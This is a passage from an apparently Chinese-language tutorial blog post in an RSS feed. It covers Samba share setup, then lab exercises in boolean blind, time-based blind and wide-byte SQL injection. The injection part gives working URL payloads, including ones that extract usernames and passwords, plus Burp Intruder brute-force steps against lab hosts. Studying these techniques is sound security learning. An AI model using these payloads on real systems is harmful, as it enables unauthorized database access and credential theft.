+systemctl enable nmb.service</p>
+<p>启动服务： systemctl start smb.service<br>
+查看状态：systemctl status smb.service</p>
+<p>备份配置：cp -p /etc/samba/smb.conf /etc/samba.conf.bak</p>
+<p>修改配置：vim /etc/samba/smb.conf</p>
+<div class="language-js line-numbers-mode" data-highlighter="shiki" data-ext="js" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-js"><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75">global</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">]</span></span>
+<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#E06C75">    workgroup</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> =</span><span style="--shiki-light:#986801;--shiki-dark:#E5C07B"> SAMBA</span></span>
+<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#E06C75">    security</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> =</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75"> user</span></span>
+<span class="line"></span>
+<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#E06C75">    passdb</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75"> backend</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> =</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75"> tdbsam</span></span>
+<span class="line"></span>
+<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#E06C75">    printing</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> =</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75"> cups</span></span>
+<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#E06C75">    printcap</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75"> name</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> =</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75"> cups</span></span>
+<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#E06C75">    load</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75"> printers</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> =</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75"> yes</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> </span></span>
+<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#E06C75">    cups</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75"> options</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> =</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75"> raw</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> </span></span>
+<span class="line"></span>
+<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75">homes</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">]</span></span>
+<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#E06C75">    comment</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> =</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75"> Home</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75"> Directories</span></span>
+<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#E06C75">    valid</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75"> users</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> =</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> %</span><span style="--shiki-light:#986801;--shiki-dark:#E5C07B">S</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">, </span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">%</span><span style="--shiki-light:#986801;--shiki-dark:#E5C07B">D</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">%</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75">w</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">%</span><span style="--shiki-light:#986801;--shiki-dark:#E5C07B">S</span></span>
+<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#E06C75">    browseable</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> =</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75"> No</span></span>
+<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#E06C75">    read</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75"> only</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> =</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75"> No</span></span>
+<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#E06C75">    inherit</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75"> acls</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> =</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75"> Yes</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> </span></span>
+<span class="line"></span>
+<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75">printers</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">]</span></span>
+<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#E06C75">    comment</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> =</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75"> All</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75"> Printers</span></span>
+<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#E06C75">    path</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> =</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> /</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">var</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">/</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75">tmp</span></span>
+<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#E06C75">    printable</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> =</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75"> Yes</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> </span></span>
+<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#E06C75">    create</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75"> mask</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> =</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 0600</span></span>
+<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#E06C75">    browseable</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> =</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75"> No</span></span>
+<span class="line"></span>
+<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75">print$</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">]</span></span>
+<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#E06C75">    comment</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> =</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75"> Printer</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75"> Drivers</span></span>
+<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#E06C75">    path</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> =</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> /</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">var</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">/</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75">lib</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">/samba/drivers</span></span>
+<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#E06C75">    write</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75"> list</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> =</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> @</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75">printadmin</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75"> root</span></span>
+<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#E06C75">    force</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75"> group</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> =</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> @</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75">printadmin</span></span>
+<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#E06C75">    create</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75"> mask</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> =</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 0664</span></span>
+<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#E06C75">    directory</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75"> mask</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> =</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 0775</span></span>
+<span class="line"></span>
+<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75">public</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">]</span></span>
+<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#E06C75">    comment</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> =</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75"> Public</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75"> Stuff</span></span>
+<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#E06C75">    path</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> =</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> /</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75">share</span></span>
+<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#E06C75">    browseable</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> =</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75"> yes</span></span>
+<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#E06C75">    guest</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75"> ok</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> =</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75"> yes</span></span>
+<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#E06C75">    writeable</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> =</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75"> yes</span></span>
+<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#E06C75">    public</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75">yes</span></span></code></pre>
+<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>创建文件夹：mkdir /share</p>
+<p>文件夹里放个文档：echo "This is a share file"&gt;/share/share.txt</p>
+<p>重启服务：systemctl restart smb.service<br>
+systemctl status smb.service</p>
+<p>测试smb.conf配置是否正确：  <code>testparm</code></p>
+<p>创建用户专门用于共享文件：useradd share</p>
+<pre><code>                                             smbpasswd -a share
+</code></pre>
+<p>linux访问：smbclient <a href="//192.168.10.103/public/" target="_blank" rel="noopener noreferrer">//192.168.10.103/public/</a></p>
+<p>windows访问：\\192.168.10.103\public</p>
+</li>
+</ol>
+<h2>布尔盲注</h2>
+<ol>
+<li>
+<h4>判断注入类型</h4>
+<p><a href="http://192.168.100.x:21727/get.php?id=1" target="_blank" rel="noopener noreferrer">http://192.168.100.x:21727/get.php?id=1</a>' and 1=1%23</p>
+<p><a href="http://192.168.100.x:21727/get.php?id=1" target="_blank" rel="noopener noreferrer">http://192.168.100.x:21727/get.php?id=1</a>' and 1=2%23</p>
+</li>
+<li>
+<h4>判断数据库名长度</h4>
+<p>输入到8时 出现回显，所以可知当前数据库为8个字</p>
+<p><a href="http://192.168.100.x:21727/get.php?id=1" target="_blank" rel="noopener noreferrer">http://192.168.100.x:21727/get.php?id=1</a>' and length(database())=8%23</p>
+<figure><figcaption>image</figcaption></figure>
+</li>
+<li>
+<h4>获取数据库名</h4>
+<ol>
+<li>挂代理抓包  payload： <code>?id=1' and mid(database(),1,1)='s'%23</code></li>
+<li>在burp suite中【代理】找到对应的包，发送到Intruder（Ctrl+l）</li>
+<li>在【Intruder】-【位置】中选择【集数炸弹-多个Payload集合】-【Paylod位置】选择爆破位置-【添加Payload位置】（此次爆破两个位置）</li>
+<li>在【Payload】中选择【payload集1】-【类型数值】-【从0-8间隔1】（数据库有8张个字符）</li>
+<li>在【Payload】中选择【payload集2】-【类型爆破】-【从a-z,1,1】</li>
+<li>在【设置】-【检索-提取】-【添加】-【从正则表达式】-【获取响应】-【You are in...........】-【确定】</li>
+<li>【开始爆破】-在结果中选择【Payload1】和【长度】进行排序，找的数据库名为：security</li>
+</ol>
+</li>
+</ol>
+<p><a href="http://192.168.100.x:21727/get.php?id=1" target="_blank" rel="noopener noreferrer">http://192.168.100.x:21727/get.php?id=1</a>' and length((select group_concat(schema_name) from information_schema.schemata))=8%23</p>
+<p><a href="http://192.168.100.x:21727/get.php?id=1" target="_blank" rel="noopener noreferrer">http://192.168.100.x:21727/get.php?id=1</a>' and mid((select group_concat(schema_name) from information_schema.schemata),1,1)='s'%23</p>
+<p><a href="http://192.168.100.x:21727/get.php?id=1" target="_blank" rel="noopener noreferrer">http://192.168.100.x:21727/get.php?id=1</a>' and mid((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1)='s'%23</p>
+<p><a href="http://192.168.100.x:21727/get.php?id=1" target="_blank" rel="noopener noreferrer">http://192.168.100.x:21727/get.php?id=1</a>' and mid((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'),1,1)='s'%23</p>
+<p><a href="http://192.168.100.x:21727/get.php?id=1" target="_blank" rel="noopener noreferrer">http://192.168.100.x:21727/get.php?id=1</a>' and mid((select group_concat(username,password) from users),1,1)='s'%23</p>
+<h2>时间盲注</h2>
+<p>sleep(5) ==&gt; 指定数据库休眠时间</p>
+<p>select sleep(5)  ==&gt; 数据库执行结果休眠5s后返回</p>
+<p>benchmark(5000000,md5('admin')) ==&gt; 测试函数运行速度，利用md5('admin')进行5000000运算。</p>
+<h4>判断是否可用休眠函数</h4>
+<p><a href="http://192.168.100.40:59110/time.php?id=1" target="_blank" rel="noopener noreferrer">http://192.168.100.40:59110/time.php?id=1</a>" and sleep(5)%23</p>
+<figure><figcaption> 延时5s可以使用</figcaption></figure>
+<h4>查询数据库名长度</h4>
+<p><a href="http://192.168.100.40:59110/time.php?id=1" target="_blank" rel="noopener noreferrer">http://192.168.100.40:59110/time.php?id=1</a>" and if(length(database())=7,sleep(5),1)%23</p>
+<figure><figcaption>从1-7长度不对，不休眠</figcaption></figure>
+<p><a href="http://192.168.100.40:59110/time.php?id=1" target="_blank" rel="noopener noreferrer">http://192.168.100.40:59110/time.php?id=1</a>" and if(length(database())=8,sleep(5),1)%23</p>
+<figure><figcaption>长度为8时休眠，说明有8个字符</figcaption></figure>
+<h4>代理抓包</h4>
+<p><a href="http://192.168.100.40:59110/time.php?id=1%E2%80%99" target="_blank" rel="noopener noreferrer">http://192.168.100.40:59110/time.php?id=1’</a> and if(mid(database(),1,1)='s',sleep(5),1)%23</p>
+<figure><figcaption>image</figcaption></figure>
+<figure><figcaption>image</figcaption></figure>
+<figure><figcaption>image</figcaption></figure>
+<figure><figcaption>image</figcaption></figure>
+<figure><figcaption>image</figcaption></figure>
+<figure><figcaption>image</figcaption></figure>
+<figure><figcaption>image</figcaption></figure>
+<h2>宽字节注入</h2>
+<h4>什么是宽字节？</h4>
+<p>两个字节宽度的编码技术。</p>
+<p>一个字符占1个字节，两个字节以上叫宽字节</p>
+<h4>为何造成宽字节注入？</h4>
+<p>利用Mysql特性，Mysql在使用GBK编码时候，会认为两个字符是一个汉字。</p>
+<h4>GBK编码原理</h4>
+<ol>
+<li>设置“set character set client:=gbk"(gbk编码设置)，通常导致编码转换的注入问题，尤其是使用php连接mysql<br>
+数据库的时候</li>
+<li>一个gbk汉字占两个字节，取值范围是（编码位数）：第一个字节为129-254，第二个字节为64-254</li>
+<li>当设置gbk编码后，遇到连续两个字节，都符合gbk取值范围，会自动解析为一个汉字</li>
+</ol>
+<h4>宽字节注入原理</h4>
+<p>程序员为了防止sq注入，对用户输入中的单引号（）进行处理，在单引号前加上斜杠（）进行转义，这样被处理后的<br>
+sq语句中，单引号不再具有作用”，仅仅是'内容'而已。这个单引号无法发挥和前后单引号闭合的作用，仅仅成为'内容</p>
+<h4>实现函数</h4>
+<p>addslashed 在敏感符号 ’ “  \ NULL 添加反斜杠转义。</p>
+<p>mysql_real_escape_string 在敏感符号 ‘ ” \ 添加反斜杠转义</p>
+<p>preg_replace( ' ' ' ,)</p>
+<h4>实现方法</h4>
+<figure><figcaption>image</figcaption></figure>
+<p><a href="http://dockerproxy.cn/etimeci/widebytesqliexp" target="_blank" rel="noopener noreferrer">dockerproxy.cn/etimeci/widebytesqliexp</a></p>
+<p><a href="http://113.45.183.x:32676/mysql-query_add.php?id=1" target="_blank" rel="noopener noreferrer">http://113.45.183.x:32676/mysql-query_add.php?id=1</a>'   输入‘被转义</p>
+<figure><figcaption>image-20240902164207-auz8ww9</figcaption></figure>
+<p><a href="http://113.45.183.x:32676/mysql-query_add.php?id=1%df'order" target="_blank" rel="noopener noreferrer">http://113.45.183.x:32676/mysql-query_add.php?id=1�'order</a> by 3--+     使用宽字节注入5df和/组成運</p>
+<figure><figcaption>image-20240902164827-jtq9lfk</figcaption></figure>
+<p><a href="http://113.45.183.x:32676/mysql-query_add.php?id=%df'union" target="_blank" rel="noopener noreferrer">http://113.45.183.x:32676/mysql-query_add.php?id=�'union</a> select 1,database(),1--+</p>
+<figure><figcaption>image-20240902164858-mbcqikv</figcaption></figure>
 ]]></content:encoded>
     </item>
   </channel>
